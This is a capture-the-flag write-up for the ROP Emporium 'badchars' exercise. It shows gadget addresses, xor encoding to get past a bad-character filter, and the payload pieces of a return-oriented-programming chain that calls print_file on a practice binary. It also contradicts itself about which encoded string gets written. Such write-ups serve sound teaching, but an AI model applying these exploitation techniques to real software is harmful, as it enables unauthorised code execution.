# badchars
Same as problem write4, function print_file will open a file with the fileaname as argument. Therefore, we can make the argument as string "flag.txt". However, "flag.txt" is too long to store in a 64-bit register, we need to write the string into data section and make the argument point to the address of string.

In this problem, there is a bad character list, which reject certain characters in buffer input, here is "a", "g", ".", "x". All these characters can be found in "flag.txt". So we need to find a way to bypass this bad characters checking. A simple way is use xor operation. Xor operation can be canceled by doing corresponded xor operation.

Check the security of binary:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
``` 
Since PIE is disabled, we can find data section address, therefore, we can use the same way in previous problem.

We write string to data section address:
```
readelf
...
.data = 0x601028 >>> dataSect = 0x601028 + 0x8
...
```
print_file function plt address:
```
plt 
Breakpoint 1 at 0x400510 (print_file@plt)
Breakpoint 2 at 0x400500 (pwnme@plt)
```
We also need some gadget to do following operations, write to data section, move data section address to rdi register, do the xor operation.
```
ROPgadget --binary badchars
...
0x0000000000400634 : mov qword ptr [r13], r12 (gadget2); ret # write string to buffer
...
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 (gadget1); ret # pop value and address to registers
...
0x00000000004006a0 : pop r14 ; pop r15 (gadget5); ret # pop xor value and address to registers
...
0x00000000004006a3 : pop rdi (gadget3); ret # pop string address to argument register
...
0x0000000000400628 : xor byte ptr [r15], r14b (gadget4); ret # do byte xor operation to ptr [byte] address
...
```
We need to find xor pairs to bypass bad characters checking. Using xor_pair in pwntools:
```
xor_pair(b'flag.txt')
>>> (b'\x01\x01\x01\x01\x01\x01\x01\x01', b'gm`f/uyu')
# '`' ^ 1 = 'a'
# 'f' ^ 1 = 'g'
# '/' ^ 1 = '.'
# 'y' ^ 1 = 'x'
```
We only need to xor bad characters in "flag.txt". Then the string we write to data section will be:
```
b'flag.txt' >>> b'fl`f/tyt'
```
Now, we can build our payload:

Firstly, write the xor string 'gm`f/uyu' to data section, then do byte xor operation to each byte to string, finally, pop the string address to rdi, and call print_file.

Same as before, there is a 32 bytes buffer, and 8 bytes rbp.
```
'A'*40
```
Pop string 'fl`f/tyt' and data section address to r12 r13, and xor byte and data section byte address into r14 and r15.
```
p64(gadget1) + b'fl`f/tyt' + p64(dataSect) + p64(0x1) + p64(dataSect+2)
```
Write to data section and do xor opeation to 'a' byte.
```
p64(gadget2) + p64(gadget4)
```
Do xor operation to rest string byte 'g', '.', 'x'.
```
# 'f' ^ 1 = 'g'
payload += p64(gadget5) + p64(0x1) + p64(dataSect+3) + p64(gadget4)
# '/' ^ 1 = '.'
payload += p64(gadget5) + p64(0x1) + p64(dataSect+4) + p64(gadget4)
# 'y' ^ 1 = 'x'
payload += p64(gadget5) + p64(0x1) + p64(dataSect+6) + p64(gadget4)
```
Pop data section address to rdi.
```
p64(gadget3) + p64(dataSect)
```
Jump to print_file.
```
p64(print_file_plt)
```
Execute exploit.py, and obtain the flag.
```
ROPE{a_placeholder_32byte_flag!}
```
